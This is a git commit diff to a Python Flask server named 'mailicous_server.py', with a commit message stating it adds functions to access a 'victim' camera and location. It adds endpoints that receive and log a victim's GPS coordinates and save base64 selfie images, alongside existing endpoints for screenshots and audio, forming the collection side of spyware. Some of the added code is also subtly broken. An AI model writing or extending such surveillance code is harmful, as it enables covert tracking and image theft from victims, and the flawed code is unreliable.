cdee11bb2d8b84720fc29450d954b62c4d1fe5e6
omar <omarqais225@gmail.com>
2026-02-04 22:10:02 +0200

    write mailcous functions to access victim camera and location

--- mailicous_server.py
+++ mailicous_server.py
@@ -1,9 +1,11 @@
 from flask import Flask,request
 import os
 from datetime import datetime
+import base64
 app = Flask(__name__)
 upload_folder = "screenshots"
 os.makedirs(upload_folder,exist_ok=True)
+os.mkdir("pictures",exist_ok=True)
 @app.route('/upload-picture',methods=["POST"])
 def upload_picture():
     if "image" not in request.files:
@@ -23,5 +25,20 @@ def upload_audio():
     os.makedirs("audio", exist_ok=True)
     audio.save(path)
     return "OK", 200
+@app.route('/get-location',methods=["POST"])
+def get_location():
+    location = request.data["location"]
+    with open("locations.log",'a') as file:
+        file.write(f"{"Accurate" if location["isStrict"] == True else "Not Accurate"}, ({location["lat"]},{location["lon"]}), Accurate: {location["accuracy"]}\n")
+@app.route('/get-selfi',methods=["POST"])
+def get_selfi():
+    data = request.json
+    image_data = data.get("image")
+    count = len(os.listdir("pictures"))
+    if image_data:
+        with open(os.path.join("pictures", f"image_{count:03d}.jpg"), "wb") as f:
+            f.write(base64.b64decode(image_data))
+        return "OK", 200
+    return "failed", 400
 if __name__ == "__main__":
     app.run(host="0.0.0.0",port=2020)
